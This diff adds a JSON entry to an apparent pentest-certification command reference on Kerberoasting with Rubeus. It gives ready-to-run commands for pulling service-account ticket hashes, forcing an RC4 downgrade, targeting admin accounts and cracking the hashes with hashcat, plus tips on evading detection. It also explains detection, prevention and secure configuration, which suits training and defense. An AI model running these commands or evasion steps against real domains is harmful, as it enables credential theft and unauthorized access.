@@ -1,0 +1,96 @@
+{
+  "id": "ad-rubeus-kerberoast",
+  "name": "Rubeus - Kerberoast (Windows)",
+  "command": ".\\Rubeus.exe kerberoast /nowrap",
+  "description": "Requests TGS tickets for all SPN accounts from a domain-joined host and prints hashcat-ready hashes. /nowrap prevents line breaks in the base64 hash output. /stats profiles the attack surface before pulling tickets. Preferred Windows tool for Kerberoasting.",
+  "platform": "windows",
+  "type": "command",
+  "opsec": "loud",
+  "category": "Password Attacks",
+  "subcategory": "Kerberoasting",
+  "certifications": [
+    "CPTS",
+    "OSCP",
+    "CRTP"
+  ],
+  "primary_cert": "CPTS",
+  "source": "CPTS Module 13: Active Directory Enumeration & Attacks",
+  "tags": [
+    "kerberoasting",
+    "hash-capture",
+    "rubeus",
+    "windows",
+    "tgs"
+  ],
+  "mitre": [
+    "T1558.003"
+  ],
+  "exam": "exam-ok",
+  "notes": "=== RUBEUS vs GETUSERSPNS.PY ===\nRubeus runs from a domain-joined Windows host using the current user's Kerberos\ncredentials (no explicit password needed). GetUserSPNs.py runs from Linux with\nexplicit credentials over the network. Both achieve the same result.\n\nRubeus advantages:\n  - Runs natively on Windows without credentials prompt\n  - /stats flag profiles attack surface before committing\n  - /rc4opsec forces RC4 downgrade when AES is default\n  - /ldapfilter enables precise targeting\n  - /outfile saves hashes to file for transfer\n  - /delay /jitter for slow-and-low approach\n\n=== RUBEUS FLAGS ===\n  /stats                     \u2192 profile only: count accounts, encryption types, show avg passwordAge\n  /nowrap                    \u2192 output hash without line breaks (required for hashcat)\n  /outfile:hashes.txt        \u2192 save to file instead of stdout\n  /ldapfilter:'admincount=1' \u2192 only roast privileged accounts\n  /user:sqlsvc               \u2192 roast single account (quieter)\n  /rc4opsec                  \u2192 request RC4 even if AES is available (forces downgrade)\n  /aes                       \u2192 explicitly request AES-encrypted tickets\n  /pwdsetafter:01-01-2020    \u2192 filter by password age\n  /delay:5000 /jitter:30     \u2192 slow the requests (5s \u00b1 30% delay per ticket)\n\n=== RECOMMENDED WORKFLOW ===\n1. .\\Rubeus.exe kerberoast /stats           \u2192 see what's there\n2. .\\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap  \u2192 hit DA-level accounts first\n3. Transfer hashes to Linux: hashcat -m 13100 hashes.txt rockyou.txt\n\n=== DETECTION ===\nEvent 4769 (TGS Request) with RC4 encryption = red flag in hardened environments\n/rc4opsec generates a specific KDC_ERR_ETYPE_NOSUPP error visible in Kerberos logs\nRubeus binary signature known to Windows Defender \u2014 may need obfuscation or AMSI bypass Also covered in: OSCP PEN-200 Chapter 22 (Attacking Active Directory Authentication).",
+  "examples": [
+    {
+      "label": "Stats first \u2014 see the attack surface",
+      "command": ".\\Rubeus.exe kerberoast /stats"
+    },
+    {
+      "label": "Roast all SPNs, unwrapped",
+      "command": ".\\Rubeus.exe kerberoast /nowrap"
+    },
+    {
+      "label": "Target only privileged accounts (admincount=1)",
+      "command": ".\\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap"
+    },
+    {
+      "label": "Save to file",
+      "command": ".\\Rubeus.exe kerberoast /outfile:hashes.txt /nowrap"
+    },
+    {
+      "label": "Force RC4 downgrade for faster cracking",
+      "command": ".\\Rubeus.exe kerberoast /rc4opsec /nowrap"
+    },
+    {
+      "label": "Ch22 \u2014 roast all SPNs and save to file (PEN-200 pattern)",
+      "command": ".\\Rubeus.exe kerberoast /outfile:hashes.kerberoast"
+    }
+  ],
+  "references": [
+    {
+      "title": "Rubeus (GhostPack)",
+      "url": "https://github.com/GhostPack/Rubeus"
+    },
+    {
+      "title": "HTB Academy - Active Directory Enumeration & Attacks",
+      "url": "https://academy.hackthebox.com/module/details/143"
+    },
+    {
+      "title": "OffSec PEN-200 - Attacking Active Directory Authentication",
+      "url": "https://www.offsec.com/courses/pen-200/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "ad-kerberoast-crack",
+      "note": "Crack the exported hashes offline.",
+      "rel": "next"
+    }
+  ],
+  "defense": {
+    "why_it_works": "Rubeus kerberoast requests TGS tickets for all SPN accounts and outputs crackable hashes from a Windows foothold.",
+    "prerequisites": "A domain context on Windows (Rubeus).",
+    "impact": "Crackable TGS hashes for offline cracking of service-account passwords.",
+    "detection": "[MITRE T1558.003] Event 4769 (TGS requested) with RC4 encryption type (0x17) when AES is standard, or a burst of TGS requests for many SPNs from one source in a short window; a request for a honeypot SPN account is malicious by definition.",
+    "artifacts": "A burst of 4769 requests; the hashes; Rubeus execution.",
+    "prevention": "Use 100+ character passwords or gMSA for service accounts; disable RC4 (force AES); audit and remove unused SPNs; deploy honeypot SPN accounts to catch roasting; Defender for Identity flags mass TGS requests.",
+    "evasion": "Rubeus can force an RC4 downgrade (/rc4opsec, /tgtdeleg) to obtain crackable tickets even where AES is preferred; request one SPN at a time to stay under the bulk-4769 threshold.",
+    "sources": [
+      "HTB M13",
+      "MITRE T1558.003"
+    ],
+    "misconfiguration": "Service accounts are registered with a Service Principal Name (SPN) but use weak, human-chosen passwords \u2014 or even share a password with other accounts. Any authenticated domain user can request a TGS for any SPN account, receiving a blob encrypted with that account's NTLM hash. The SPN registration itself is not the flaw; the flaw is weak passwords on SPN accounts and permitting RC4 encryption (which produces a shorter, faster-to-crack blob).",
+    "vulnerable_config": "# Service account set up manually with a weak password + SPN\n# Attacker can find these with:\nGet-ADUser -Filter {ServicePrincipalName -ne '$null'} -Properties ServicePrincipalName,PasswordLastSet\n\n# Bad state \u2014 password set 4 years ago, RC4 permitted:\n# Name: svc_sql  PasswordLastSet: 2020-01-15  SPN: MSSQLSvc/db01.corp.local:1433\n# RC4 (0x17) requested in TGS ticket \u2014 short hash, GPU-crackable\n\n# Confirming RC4 is available:\nGet-ADUser svc_sql -Properties msDS-SupportedEncryptionTypes\n# msDS-SupportedEncryptionTypes: 0 (= RC4+AES both permitted if 0 or blank)",
+    "secure_config": "# Fix 1 \u2014 Use Group Managed Service Accounts (gMSA): 240-char random passwords,\n# auto-rotated by AD, no human ever knows the password\nNew-ADServiceAccount -Name gmsa_sql -DNSHostName sql.corp.local \\\n    -PrincipalsAllowedToRetrieveManagedPassword 'db-servers-grp'\nInstall-ADServiceAccount gmsa_sql\n\n# Fix 2 \u2014 For legacy accounts that must keep SPNs:\n# Set a 100+ character random password (AD max is 127 chars):\n$pw = [System.Web.Security.Membership]::GeneratePassword(127,20)\nSet-ADAccountPassword svc_sql -NewPassword (ConvertTo-SecureString $pw -AsPlainText -Force)\n\n# Fix 3 \u2014 Disable RC4, require AES-only:\nSet-ADUser svc_sql -KerberosEncryptionType AES128,AES256\n# msDS-SupportedEncryptionTypes = 24 (AES128+AES256 only)"
+  },
+  "tools": [
+    "Rubeus"
+  ]
+}
